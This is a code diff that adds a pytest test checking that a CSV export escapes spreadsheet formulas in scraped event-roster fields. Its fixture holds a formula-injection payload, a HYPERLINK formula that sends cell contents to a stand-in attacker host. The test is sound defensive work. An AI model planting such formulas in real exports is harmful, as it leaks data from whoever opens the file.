@@ -163,6 +163,35 @@ def test_the_csv_says_what_the_screen_says(monkeypatch):
     assert acme_row["Source page"] == "https://widgetexpo.test/exhibitors"
 
 
+def test_the_csv_defuses_formula_injection_in_scraped_roster_fields(monkeypatch):
+    """org_name/person_name/source_url are scraped from a public, third-party
+    event roster (exhibitors/sponsors self-submit these fields), not written
+    by anyone on this platform. A name that is itself a spreadsheet formula
+    must come out quoted-inert, not live, when a staffer opens the export in
+    Excel/Sheets -- the same _csv_safe() defense the candidates.csv and
+    outreach.csv exports for this agent, and the Company/People Intelligence
+    export, already use."""
+    payload = '=HYPERLINK("https://attacker.example/leak?"&A1)'
+    monkeypatch.setattr(store, "get_run", lambda run_id, email: {
+        "id": run_id, "mode": "lookup", "query": "Widget Expo", "status": "complete",
+        "stage": "done", "error": None, "summary": {}, "credits_spent": 1})
+    monkeypatch.setattr(store, "get_events", lambda run_id: [{"name": "Widget Expo"}])
+    monkeypatch.setattr(store, "get_sources", lambda run_id: [])
+    monkeypatch.setattr(store, "get_participants", lambda run_id, role=None: [
+        {"org_name": payload, "org_domain": "acme.test", "role": "exhibitor",
+         "person_name": payload, "person_title": None, "tier": None, "booth": "214",
+         "apollo": {"name": "Acme", "industry": "robotics", "employees": 400},
+         "source_url": "https://widgetexpo.test/exhibitors"},
+    ])
+    r = _client("reporting@position2.com").get(BASE + "/runs/5/export.csv")
+    text = r.get_data(as_text=True)
+    import csv, io
+    row = next(csv.DictReader(io.StringIO(text)))
+    assert row["Organisation"] == "'" + payload, row["Organisation"]
+    assert row["Person"] == "'" + payload, row["Person"]
+    assert not row["Organisation"].startswith("="), row["Organisation"]
+
+
 def test_the_csv_is_crlf_terminated():
     """csv.writer's default lineterminator is \\r\\n regardless of how the
     handle was opened. That is correct for CSV and is asserted here so nobody
